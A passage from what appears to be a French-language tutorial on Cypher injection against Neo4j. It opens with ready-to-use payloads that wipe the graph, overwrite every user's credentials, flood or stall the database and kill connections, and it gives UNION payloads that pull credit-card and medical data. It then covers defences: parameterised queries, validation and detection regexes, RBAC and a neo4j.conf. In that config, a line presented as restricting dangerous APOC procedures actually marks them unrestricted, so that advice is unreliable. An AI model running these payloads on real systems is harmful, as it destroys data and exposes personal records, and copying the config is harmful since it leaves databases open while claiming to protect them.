' MATCH (target:User {name: 'victim'}) DETACH DELETE target //

-- ⚠️ Suppression massive conditionnelle  
' MATCH (old:User) WHERE old.last_login < datetime() - duration('P1Y') DETACH DELETE old //

-- ⚠️ Suppression totale (EXTRÊMEMENT DANGEREUX)
' MATCH (n) DETACH DELETE n //
```

**🗃️ Corruption de Base**

```cypher
-- ⚠️ Suppression des relations critiques
' MATCH ()-[r:FRIEND|FOLLOW|MEMBER_OF]-() DELETE r //

-- ⚠️ Modification de données critiques
' MATCH (u:User) SET u.email = 'hacked@evil.com', u.password = 'pwned123' //
```

**💀 Déni de Service**

```cypher
-- 💣 Requêtes coûteuses (bombes cartésiennes)
' MATCH (a)-[*]-(b) RETURN count(*) //

-- 🔗 Création de millions de nœuds
' FOREACH (i IN range(1, 1000000) | CREATE (:Spam {id: i})) //

-- 💀 Kill des connexions
' CALL dbms.listConnections() YIELD connectionId WITH collect(connectionId) AS connections CALL dbms.killConnections(connections) YIELD connectionId RETURN connectionId //
```

***

### 8. Impact et Dangers

#### 8.1 Classification des Impacts

```
💥 IMPACT CRITIQUE (9.0-10.0 CVSS):
├── Accès root à la base de données
├── Exfiltration complète des données
├── Suppression totale des données  
└── Compromise de l'infrastructure

🔥 IMPACT ÉLEVÉ (7.0-8.9 CVSS):
├── Accès aux données sensibles
├── Modification des permissions
├── SSRF avec accès aux services internes
└── Déni de service prolongé

⚠️ IMPACT MOYEN (4.0-6.9 CVSS):
├── Accès limité aux données
├── Énumération des utilisateurs
├── Bypass d'authentification ponctuel
└── DoS temporaire

ℹ️ IMPACT FAIBLE (0.1-3.9 CVSS):
├── Divulgation d'informations mineures
├── Énumération de la structure
└── Erreurs révélatrices
```

#### 8.2 Scénarios d'Attaque Réels

**🏢 Scenario 1: E-commerce**

```
🛍️ Application: Site de vente en ligne
🎯 Point d'entrée: Recherche de produits
💣 Injection: /search?q=laptop' UNION MATCH (u:User) RETURN u.email, u.creditcard //

📊 Impact:
├── 50,000 emails clients exposés
├── 12,000 numéros de cartes de crédit
├── Données de commandes historiques  
└── Informations de livraison

💰 Coût estimé: 2.5M€ (amendes RGPD + dommages)
```

**🏥 Scenario 2: Système de Santé**

```
🏥 Application: Dossiers médicaux électroniques  
🎯 Point d'entrée: Recherche patient par nom
💣 Injection: /patients/search?name=Smith' UNION MATCH (p:Patient)-[:HAS_CONDITION]->(c:MedicalCondition) RETURN p.ssn, c.diagnosis //

📊 Impact:
├── 100,000 dossiers médicaux exposés
├── Diagnostics et traitements révélés
├── Numéros de sécurité sociale
└── Informations d'assurance santé

💰 Coût estimé: 15M€ + poursuites judiciaires
```

**🏛️ Scenario 3: Infrastructure Gouvernementale**

```
🏛️ Application: Système de gestion des citoyens
🎯 Point d'entrée: API de vérification d'identité  
💣 Injection: SSRF vers métadonnées AWS + escalade

📊 Impact:
├── Accès aux bases de données nationales
├── Informations de sécurité nationale
├── Compromise de l'infrastructure cloud
└── Accès à d'autres systèmes gouvernementaux

💰 Coût estimé: Incalculable (sécurité nationale)
```

#### 8.3 Conséquences Techniques Spécifiques

**🔗 Particularités des Bases Graphiques**

```
🕸️ PROPAGATION RAPIDE:
   Les relations permettent l'accès rapide à des données connexes
   
   Exemple: User → Friend → Company → Employees → Salaries

🔄 COMPOSITION DE REQUÊTES:
   Possibilité d'ajouter des clauses arbitraires
   Plus flexible que les injections SQL traditionnelles

🌐 SSRF NATIF:  
   LOAD CSV intégré = SSRF par design
   Pas besoin de fonctions spéciales

⚡ PERFORMANCES:
   Requêtes mal formées peuvent paralyser la base
   Traversées infinies possibles
```

#### 8.4 Impact sur la Conformité

**📋 RGPD (Règlement Général sur la Protection des Données)**

```
🚫 VIOLATIONS POTENTIELLES:
├── Article 5: Licéité du traitement (accès non autorisé)
├── Article 25: Protection des données dès la conception
├── Article 32: Sécurité du traitement  
└── Article 33: Notification de violation (72h)

💰 AMENDES:
├── Niveau 1: Jusqu'à 10M€ ou 2% du CA annuel
└── Niveau 2: Jusqu'à 20M€ ou 4% du CA annuel
```

**🏥 Secteur de la Santé (HIPAA, HDS)**

```
🚫 VIOLATIONS CRITIQUES:
├── Accès non autorisé aux PHI (Protected Health Information)
├── Divulgation involontaire de données médicales
├── Manque de contrôles d'accès appropriés
└── Absence de chiffrement des données sensibles

💰 SANCTIONS:
├── Amendes civiles: 100$ à 1.5M$ par violation
├── Sanctions pénales: Jusqu'à 10 ans de prison
└── Exclusion des programmes fédéraux
```

***

### 9. Protection et Mitigation

#### 9.1 Solution Principale: Requêtes Paramétrées

**✅ Implémentation Correcte**

```javascript
// ✅ SÉCURISÉ - Neo4j JavaScript Driver
const neo4j = require('neo4j-driver');

// Requête paramétrée correcte
async function getUserByName(session, nom) {
    const result = await session.run(
        'MATCH (u:Utilisateur) WHERE u.nom = $nom RETURN u',
        { nom: nom }  // Paramètre sécurisé
    );
    return result.records;
}

// ✅ SÉCURISÉ - Multiples paramètres
async function getUsersByFilter(session, nom, age, ville) {
    const result = await session.run(
        `MATCH (u:Utilisateur) 
         WHERE u.nom = $nom AND u.age > $age AND u.ville = $ville 
         RETURN u`,
        { nom: nom, age: age, ville: ville }
    );
    return result.records;
}
```

**❌ Implémentations Vulnérables à Éviter**

```javascript
// ❌ VULNÉRABLE - Concaténation de chaînes
const query = "MATCH (u:Utilisateur) WHERE u.nom = '" + nom + "' RETURN u";

// ❌ VULNÉRABLE - Template literals
const query = `MATCH (u:Utilisateur) WHERE u.nom = '${nom}' RETURN u`;

// ❌ VULNÉRABLE - Interpolation directe
const query = util.format("MATCH (u) WHERE u.id = %d RETURN u", id);

// ❌ VULNÉRABLE - Remplacement simple
const query = "MATCH (u) WHERE u.nom = 'PLACEHOLDER' RETURN u".replace('PLACEHOLDER', nom);
```

#### 9.2 Validation et Filtrage des Entrées

**🛡️ Validation Stricte**

```javascript
// ✅ Whitelist de caractères autorisés
function validerNomUtilisateur(nom) {
    const regex = /^[a-zA-Z0-9._-]{3,30}$/;
    return regex.test(nom);
}

// ✅ Validation d'ID numérique
function validerID(id) {
    const numericId = parseInt(id, 10);
    return !isNaN(numericId) && numericId > 0 && numericId < 999999999;
}

// ✅ Validation d'email
function validerEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email) && email.length <= 254;
}

// ✅ Échappement des caractères spéciaux (si nécessaire)
function echapperCypher(input) {
    return input
        .replace(/\\/g, '\\\\')
        .replace(/'/g, "\\'")
        .replace(/"/g, '\\"')
        .replace(/\n/g, '\\n')
        .replace(/\r/g, '\\r');
}
```

**🔒 Contrôles de Sécurité Avancés**

```javascript
// ✅ Limitation de la longueur
const MAX_INPUT_LENGTH = 100;
function validerLongueur(input) {
    return typeof input === 'string' && input.length <= MAX_INPUT_LENGTH;
}

// ✅ Détection de patterns suspects
function detecterInjection(input) {
    const patternsSuspects = [
        /\bUNION\b/i, /\bMATCH\b/i, /\bDELETE\b/i, 
        /\bDROP\b/i, /\bCREATE\b/i, /\bSET\b/i,
        /\bLOAD\s+CSV\b/i, /\bCALL\b/i, /\/\//, /\/\*/
    ];
    
    return patternsSuspects.some(pattern => pattern.test(input));
}

// ✅ Middleware de validation Express.js
const validationMiddleware = (req, res, next) => {
    const { nom, id, email } = req.body;
    
    if (nom && !validerNomUtilisateur(nom)) {
        return res.status(400).json({ error: 'Nom utilisateur invalide' });
    }
    
    if (id && !validerID(id)) {
        return res.status(400).json({ error: 'ID invalide' });
    }
    
    if (email && !validerEmail(email)) {
        return res.status(400).json({ error: 'Email invalide' });
    }
    
    // Détection d'injection
    const inputs = [nom, email].filter(Boolean);
    if (inputs.some(detecterInjection)) {
        console.log('🚨 Tentative d\'injection détectée:', req.ip);
        return res.status(400).json({ error: 'Requête suspecte détectée' });
    }
    
    next();
};
```

#### 9.3 Configuration Sécurisée de Neo4j

**🔧 Fichier neo4j.conf**

```bash
# 🛡️ Configuration sécurisée Neo4j

# Désactiver l'import CSV depuis des URLs externes
dbms.security.allow_csv_import_from_file_urls=false

# Restreindre les procédures APOC dangereuses  
dbms.security.procedures.unrestricted=apoc.load.*,apoc.import.*,apoc.export.*
dbms.security.procedures.whitelist=apoc.path.*,apoc.coll.*,apoc.text.*

# Limite des résultats pour éviter les extractions massives
cypher.default_rows_limit=1000

# Timeout des requêtes pour éviter les DoS
dbms.transaction.timeout=30s
dbms.transaction.bookmark_ready_timeout=30s

# Logging de sécurité
dbms.logs.query.enabled=true
dbms.logs.query.threshold=1s
dbms.logs.security.level=INFO

# Restriction des imports
server.directories.import=/var/lib/neo4j/import
dbms.security.allow_csv_import_from_file_urls=false

# Chiffrement en transit
dbms.ssl.policy.bolt.enabled=true
dbms.ssl.policy.https.enabled=true
```

#### 9.4 Contrôle d'Accès et RBAC

**👥 Gestion des Rôles Neo4j**

```cypher
-- 🔐 Création de rôles avec permissions limitées

-- Rôle lecture seule
CREATE ROLE reader;
GRANT READ ON GRAPH * TO reader;

-- Rôle application avec permissions limitées  
CREATE ROLE app_user;
GRANT READ ON GRAPH * TO app_user;
GRANT WRITE ON GRAPH * TO app_user;
DENY DELETE ON GRAPH * TO app_user;  -- Pas de suppression
DENY DROP ON DATABASE * TO app_user; -- Pas de suppression de base

-- Utilisateur application
CREATE USER app_service SET PASSWORD 'complex_password_123!';
GRANT ROLE app_user TO app_service;

-- 🚫 Ne jamais utiliser le compte neo4j pour l'application !
-- Créer des comptes spécifiques avec permissions minimales
```

**🏛️ Architecture de Sécurité en Couches**

```
🏰 DEFENSE EN PROFONDEUR:

┌─────────────────────────────────────────┐
│  1. WAF (Web Application Firewall)     │
│     - Filtrage des requêtes malveillantes│
│     - Rate limiting                     │
├─────────────────────────────────────────┤
│  2. Application Layer                   │  
│     - Validation des entrées            │
│     - Requêtes paramétrées              │
│     - Authentification forte            │
├─────────────────────────────────────────┤
│  3. Network Layer                       │
│     - Segmentation réseau               │
│     - Firewall interne                  │ 
│     - VPN/Private networks              │
├─────────────────────────────────────────┤
│  4. Database Layer                      │
│     - RBAC strict                       │
│     - Audit logging                     │
│     - Chiffrement                       │
└─────────────────────────────────────────┘
```

#### 9.5 Monitoring et Détection

**📊 Surveillance des Requêtes**

```javascript
// ✅ Middleware de logging des requêtes suspectes
const suspiciousQueryLogger = (req, res, next) => {
    const suspiciousPatterns = [
        /UNION.*CALL/i, /LOAD.*CSV.*http/i, /DELETE.*MATCH/i,
        /\/\*.*\*\//g, /\/\//, /\bdb\.labels\b/i,
        /apoc\.util\.sleep/i, /DETACH.*DELETE/i
    ];
    
    const queryString = JSON.stringify(req.query) + JSON.stringify(req.body);
    
    const isSuspicious = suspiciousPatterns.some(pattern => 
        pattern.test(queryString)
    );
    
    if (isSuspicious) {
        console.log('🚨 ALERTE SÉCURITÉ - Requête suspecte détectée:');
        console.log('IP:', req.ip);
        console.log('User-Agent:', req.get('User-Agent')); 
        console.log('Query:', queryString);
        console.log('Timestamp:', new Date().toISOString());
        
        // Optionnel: bloquer la requête
        // return res.status(403).json({ error: 'Accès refusé' });
    }
    
    next();
};
```

**📈 Métriques de Sécurité**

```javascript
// ✅ Compteurs de sécurité avec Prometheus/StatsD
const securityMetrics = {
    injectionAttempts: 0,
    blockedRequests: 0,
    suspiciousQueries: 0,
    
    recordInjectionAttempt(ip, userAgent) {
        this.injectionAttempts++;
        // Envoi vers système de monitoring
        statsD.increment('security.injection_attempts', 1, {
            ip: ip,
            user_agent: userAgent
        });
    }
};
```
